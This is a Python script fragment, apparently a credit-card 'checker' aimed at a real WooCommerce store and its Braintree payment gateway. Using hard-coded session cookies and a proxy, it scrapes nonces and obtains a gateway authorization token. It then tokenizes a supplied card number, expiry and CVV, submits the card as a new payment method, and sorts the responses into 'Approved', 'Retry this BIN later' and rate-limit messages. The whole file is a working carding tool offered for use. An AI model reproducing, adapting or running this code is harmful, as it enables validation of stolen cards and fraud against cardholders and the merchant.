    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

    rrr = requests.get("https://www.flexinnovations.com/my-account/add-payment-methods/", cookies=cookies, headers=headers) 
    nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', rrr.text)[0]
    print(nonce)
    client = re.findall(r'"client_token_nonce":"(.*?)"', rrr.text)[0]   
    print(client)

    response = requests.get("https://ipinfo.io/json", proxies=proxy)
    print(response.text)
    
    cookies = {
    
    '_ga': 'GA1.1.5590199.1744108911',
    'mailchimp_user_email': 'aman44%40gmail.com',
    'wordpress_logged_in_a3a6a1469a1091436aba07df5e7aa87a': big,
    'tinv_wishlistkey': '22122c',
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.flexinnovations.com%2Fmy-account%2Fadd-payment-methods%2F',
    'tinvwl_wishlists_data_counter': '0',
    '_ga_5BLLY83SK2': 'GS1.1.1744111647.2.1.1744111743.0.0.0',
}

    
    headers = {
    'authority': 'www.flexinnovations.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.flexinnovations.com',
    'referer': 'https://www.flexinnovations.com/my-account/add-payment-methods/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
}
    
    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client,
    }
    
    rrr = requests.post("https://www.flexinnovations.com/wp-admin/admin-ajax.php", cookies=cookies, headers=headers, data=data)       
    enc = rrr.json()['data']    
    decoded_text = base64.b64decode(enc).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)[0]
    print(au)

    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '9ed715e1-c37c-407d-99a5-9f5da298ac66',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    tok = response.json()['data']['tokenizeCreditCard']['token']
    
    
    print(tok)
    
    
    
    
    cookies = {
    '_ga': 'GA1.1.5590199.1744108911',
    'mailchimp_user_email': 'aman44%40gmail.com',
    'wordpress_logged_in_a3a6a1469a1091436aba07df5e7aa87a': big,
    'tinv_wishlistkey': '22122c',
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.flexinnovations.com%2Fmy-account%2Fadd-payment-methods%2F',
    'tinvwl_wishlists_data_counter': '0',
    '_ga_5BLLY83SK2': 'GS1.1.1744111647.2.1.1744112186.0.0.0',
}   
    

   
    
    headers = {
    'authority': 'www.flexinnovations.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.flexinnovations.com',
    'referer': 'https://www.flexinnovations.com/my-account/add-payment-methods/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
    
    data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"dc4adbf00618499f422cc24d6ffeedb6"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"dc4adbf00618499f422cc24d6ffeedb6"}'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', nonce),
    ('_wp_http_referer', '/my-account/add-payment-methods/'),
    ('woocommerce_add_payment_method', '1'),
]

    response = requests.post(
    'https://www.flexinnovations.com/my-account/add-payment-methods/',
    cookies=cookies,
    headers=headers,
    data=data
)

    text = response.text
    
        
    pattern = r'Reason: (.+?)\s*</li>'
        
    match = re.search(pattern, text)
    if match:
        result = match.group(1)
        
        if 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
    else:
        if 'ad9ded' in text or 'Paymen8t method successfully added.' in text:
            result = "Approved ✅"
            return result
        else:
            try:
                result = text.split('Status code ')[1].split('<')[0]
                print(result)
            except:
                try:
                    result = match
                except:
                    result = 'Unknow Response'

    if 'risk_threshold' in result:
        return "RISK: Retry this BIN later."
    elif 'You cannot add a new payment method so soon after the previous one' in result:
        return "Please wait for 20 seconds."
    elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
        return 'Approved ✅'
    elif 'Duplicate card exists in the vault.' in result:
        return 'Approved ✅! - Duplicate'
    elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
        return 'Approved ✅! - AVS-CVV'
    elif "Invalid postal code" in result or "CVV." in result:
        return 'Approved ✅! - Invalid postal code and cvv'
    elif "Card Issuer Declined CVV" in result:
        return 'Approved ✅! - Declined CVV'
    elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
        return 'Approved ✅!'
    else:
        return result
